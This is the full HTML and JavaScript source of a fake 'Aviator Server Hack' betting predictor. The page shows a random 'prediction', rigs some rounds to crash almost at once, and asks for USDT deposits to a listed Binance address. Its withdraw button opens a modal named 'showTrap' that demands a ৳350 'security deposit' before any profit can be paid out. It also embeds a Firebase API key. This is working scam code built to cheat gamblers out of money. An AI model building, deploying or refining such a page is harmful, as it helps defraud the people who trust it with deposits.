<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviator AI - Smart Cycle Pro</title>
    <style>
        :root { --primary: #ff0040; --bg: #0b0c0d; --gold: #f3ba2f; --neon: #00f2ff; --green: #28a745; --binance: #f0b90b; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; }
        .nav { background: #1b1c1d; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; }
        .bal-box { color: var(--gold); font-weight: bold; border: 1px solid var(--gold); padding: 5px 15px; border-radius: 20px; }
        .tab-bar { display: flex; justify-content: center; background: #111; padding: 10px; gap: 10px; }
        .tab-btn { background: #222; color: #888; border: none; padding: 10px 15px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .tab-btn.active { background: var(--primary); color: white; }
        .page { display: none; padding: 15px; }
        .page.active { display: block; }
        .predictor-card { background: #000; border: 2px solid var(--neon); border-radius: 15px; width: 210px; margin: 0 auto 15px; padding: 12px; box-shadow: 0 0 20px var(--neon); }
        #next-pred { font-size: 2.8rem; color: var(--neon); font-weight: 900; text-shadow: 0 0 10px var(--neon); }
        #game-box { position: relative; width: 100%; max-width: 600px; height: 300px; background: radial-gradient(circle, #1a1a1a, #000); margin: 0 auto; border-radius: 15px; border: 1px solid #333; overflow: hidden; }
        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 4.5rem; font-weight: 900; z-index: 10; }
        .controls { background: #1b1c1d; width: 100%; max-width: 600px; margin: 15px auto; padding: 20px; border-radius: 20px; box-sizing: border-box; }
        .btn-main { width: 100%; padding: 18px; font-size: 1.5rem; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; color: white; }
        .card-ui { background: #1b1c1d; padding: 20px; border-radius: 15px; text-align: left; max-width: 400px; margin: auto; border: 1px solid #333; }
        .binance-box { background: #000; border: 1px solid var(--binance); padding: 15px; border-radius: 10px; margin-top: 10px; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; padding: 20px; }
        .m-content { background: #1b1c1d; padding: 30px; border-radius: 20px; width: 100%; max-width: 350px; border: 1px solid #444; }
    </style>
</head>
<body>

    <div class="nav">
        <div style="font-weight:900; color:var(--primary);">AVIATOR SERVER HACK</div>
        <div class="bal-box">৳ <span id="balance">0.00</span></div>
    </div>

    <div class="tab-bar">
        <button class="tab-btn active" onclick="showPage('game', this)">HACKER BOT</button>
        <button class="tab-btn" onclick="showPage('deposit', this)">DEPOSIT</button>
        <button class="tab-btn" onclick="showPage('withdraw', this)">WITHDRAW</button>
    </div>

    <div id="game" class="page active">
        <div class="predictor-card">
            <div id="next-pred">SCANNING</div>
            <div style="font-size:0.6rem; color:#4caf50;">● BOT ACTIVE</div>
        </div>
        <div id="game-box">
            <div id="multiplier">1.00x</div>
            <canvas id="gameCanvas"></canvas>
        </div>
        <div class="controls">
            <input type="number" id="betAmt" value="50" min="20" style="background:#000; color:white; border:1px solid #444; padding:12px; width:80px; border-radius:8px; margin-bottom:10px; text-align:center;">
            <button id="actionBtn" class="btn-main" style="background: var(--green);">PLACE BET</button>
        </div>
    </div>

    <div id="deposit" class="page">
        <div class="card-ui">
            <h3 style="color:var(--binance); margin-top:0;">Binance USDT (BEP20)</h3>
            <div class="binance-box">
                <small style="color:var(--binance)">USDT Address (BEP20):</small><br>
                <span id="addr" style="font-size:0.65rem; word-break:break-all;">0x71C7656EC7ab88b098defB751B7401B5f6d8976F</span>
                <button onclick="copyAddr()" style="float:right; background:var(--binance); border:none; padding:4px 8px; border-radius:4px; font-weight:bold; cursor:pointer; font-size:0.7rem;">COPY</button>
            </div>
            <button onclick="alert('Verification Started')" class="btn-main" style="background:var(--binance); color:black; margin-top:15px; font-size:1.1rem;">SUBMIT PAYMENT</button>
        </div>
    </div>

    <div id="withdraw" class="page">
        <div class="card-ui">
            <h3>Withdraw Profit</h3>
            <button onclick="showTrap()" class="btn-main" style="background:#333;">Request Withdrawal</button>
        </div>
    </div>

    <div id="trapModal" class="modal">
        <div class="m-content">
            <h3 style="color:var(--primary); margin-top:0;">Security Error</h3>
            <p style="font-size:0.85rem; color:#ccc;">To verify your wallet address for profit withdrawal, a security deposit of **৳350** is required.</p>
            <button onclick="showPage('deposit')" class="btn-main" style="background:var(--green); font-size:1rem;">VERIFY NOW</button>
        </div>
    </div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = {
        apiKey: "AIzaSyBrMOmNOmopMwh35MFs8_u99LbroeLu_4s",
        authDomain: "avaitor-game-c3d80.firebaseapp.com",
        databaseURL: "https://avaitor-game-c3d80-default-rtdb.firebaseio.com",
        projectId: "avaitor-game-c3d80"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const userRef = ref(db, 'users/user_01');

    let balance = 0, isFlying = false, startTime, currentBet = 0;
    let predSignal = 0, actualCrash = 0;
    let roundCount = 0, cycleLength = 0, falseRounds = [];

    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 600; canvas.height = 300;

    onValue(userRef, (s) => {
        balance = s.val().balance;
        document.getElementById('balance').innerText = balance.toFixed(2);
    });

    function generateNewCycle() {
        cycleLength = Math.floor(Math.random() * 3) + 5; 
        roundCount = 0;
        let positions = [];
        let count = Math.random() < 0.5 ? 2 : 3; 
        while(positions.length < count) {
            let pos = Math.floor(Math.random() * cycleLength);
            if(!positions.includes(pos) && !positions.includes(pos-1) && !positions.includes(pos+1)) {
                positions.push(pos);
            }
        }
        falseRounds = positions;
    }

    function setupRound() {
        if (roundCount >= cycleLength) generateNewCycle();
        predSignal = (Math.random() * (10.00 - 1.50) + 1.50).toFixed(2);
        if (falseRounds.includes(roundCount)) {
            actualCrash = (1.00 + Math.random() * 0.12).toFixed(2);
        } else {
            actualCrash = predSignal;
        }
        document.getElementById('next-pred').innerText = predSignal + "x";
        document.getElementById('multiplier').innerText = "1.00x";
        document.getElementById('multiplier').style.color = "white";
        roundCount++;
        ctx.clearRect(0,0,600,300);
    }

    generateNewCycle();
    setupRound();

    function drawLine(elapsed) {
        ctx.clearRect(0,0,600,300);
        ctx.beginPath(); ctx.strokeStyle = "#ff0040"; ctx.lineWidth = 5;
        ctx.moveTo(0, 300);
        ctx.quadraticCurveTo(elapsed*60, 300, elapsed*120, 300-(elapsed*45));
        ctx.stroke();
    }

    function animate() {
        if (!isFlying) return;
        let elapsed = (Date.now() - startTime) / 1000;
        let val = (1 + Math.pow(elapsed, 1.4) * 0.15).toFixed(2);
        document.getElementById('multiplier').innerText = val + "x";
        drawLine(elapsed);
        if (parseFloat(val) >= actualCrash) {
            isFlying = false;
            document.getElementById('multiplier').style.color = "red";
            setTimeout(() => {
                document.getElementById('actionBtn').innerText = "PLACE BET";
                document.getElementById('actionBtn').style.background = "var(--green)";
                setupRound();
            }, 2500);
        } else { requestAnimationFrame(animate); }
    }

    document.getElementById('actionBtn').onclick = function() {
        if(!isFlying) {
            let amt = parseFloat(document.getElementById('betAmt').value);
            if(balance < amt) return alert("Low Balance!");
            currentBet = amt; balance -= amt; update(userRef, {balance});
            isFlying = true; startTime = Date.now();
            this.innerText = "CASH OUT"; this.style.background = "#ff9800";
            animate();
        } else {
            let winM = parseFloat(document.getElementById('multiplier').innerText);
            balance += (currentBet * winM); update(userRef, {balance});
            isFlying = false; alert("Won ৳" + (currentBet * winM).toFixed(2));
        }
    };

    window.showPage = (p, b) => {
        document.querySelectorAll('.page').forEach(x => x.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(x => x.classList.remove('active'));
        document.getElementById(p).classList.add('active');
        if(b) b.classList.add('active');
        document.getElementById('trapModal').style.display='none';
    };

    window.copyAddr = () => {
        navigator.clipboard.writeText(document.getElementById('addr').innerText);
        alert("Copied!");
    };

    window.showTrap = () => {
        document.getElementById('trapModal').style.display = 'flex';
    };
</script>
</body>
</html>
